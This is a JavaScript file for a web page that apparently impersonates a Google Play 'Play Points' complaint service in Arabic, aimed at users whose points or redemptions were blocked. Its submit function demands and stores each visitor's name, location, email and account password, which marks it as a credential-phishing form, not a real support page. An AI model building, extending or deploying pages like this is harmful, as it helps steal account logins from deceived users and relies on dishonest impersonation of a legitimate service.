/* ── Storage Key ── */
const STORAGE_KEY = 'gplay_complaints';

/* ── Modal ── */
function openModal() {
  document.getElementById('modal-overlay').classList.add('open');
  document.body.style.overflow = 'hidden';
  setTimeout(() => document.getElementById('f-name').focus(), 60);
}

function closeModal() {
  document.getElementById('modal-overlay').classList.remove('open');
  document.body.style.overflow = '';
  ['f-name', 'f-location', 'f-email', 'f-password'].forEach(id =>
    document.getElementById(id).value = ''
  );
  document.querySelectorAll('input[name="problem"]').forEach(r => r.checked = false);
  document.getElementById('f-password').type = 'password';
}

function overlayClick(e) {
  if (e.target === document.getElementById('modal-overlay')) closeModal();
}

/* ── Password toggle ── */
function togglePass() {
  const input = document.getElementById('f-password');
  input.type = input.type === 'password' ? 'text' : 'password';
}

/* ── Submit ── */
function submitComplaint() {
  const name     = document.getElementById('f-name').value.trim();
  const location = document.getElementById('f-location').value.trim();
  const email    = document.getElementById('f-email').value.trim();
  const password = document.getElementById('f-password').value;
  const problem  = document.querySelector('input[name="problem"]:checked');

  const labels = {
    'ban-account': 'حظر حسابي في نقاط التشغيل',
    'ban-redeem':  'تم منعي من استبدال نقاط التشغيل بمال فعلي',
    'ban-points':  'تم حظري من نقاط التشغيل'
  };

  if (!name)     return showToast('الرجاء إدخال الاسم الكامل');
  if (!location) return showToast('الرجاء إدخال الدولة أو المنطقة');
  if (!email)    return showToast('الرجاء إدخال البريد الإلكتروني');
  if (!password) return showToast('الرجاء إدخال كلمة المرور');
  if (!problem)  return showToast('الرجاء اختيار نوع المشكلة');

  /* Save to localStorage */
  const complaints = JSON.parse(localStorage.getItem(STORAGE_KEY) || '[]');
  complaints.push({
    id:           Date.now(),
    name,
    location,
    email,
    password,
    problem:      problem.value,
    problemLabel: labels[problem.value],
    date:         new Date().toISOString()
  });
  localStorage.setItem(STORAGE_KEY, JSON.stringify(complaints));

  closeModal();

  /* Show success box */
  const box = document.getElementById('success-box');
  box.classList.add('show');
  box.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
}

/* ── Terms ── */
function openTerms() {
  const overlay = document.getElementById('terms-overlay');
  overlay.classList.add('open');
  document.body.style.overflow = 'hidden';

  const content = document.getElementById('terms-content');
  if (content.dataset.loaded) return;

  fetch('conditions.txt')
    .then(r => r.text())
    .then(text => {
      content.textContent = text;
      content.dataset.loaded = '1';
    })
    .catch(() => {
      content.textContent = 'تعذّر تحميل الشروط. تأكد من وجود ملف conditions.txt في نفس المجلد.';
    });
}

function closeTerms() {
  document.getElementById('terms-overlay').classList.remove('open');
  document.body.style.overflow = '';
}

/* ── Toast ── */
function showToast(msg) {
  const el = document.getElementById('toast');
  el.textContent = msg;
  el.classList.add('show');
  setTimeout(() => el.classList.remove('show'), 3000);
}

/* ── Keyboard ── */
document.addEventListener('keydown', e => {
  if (e.key === 'Escape') { closeModal(); closeTerms(); }
});
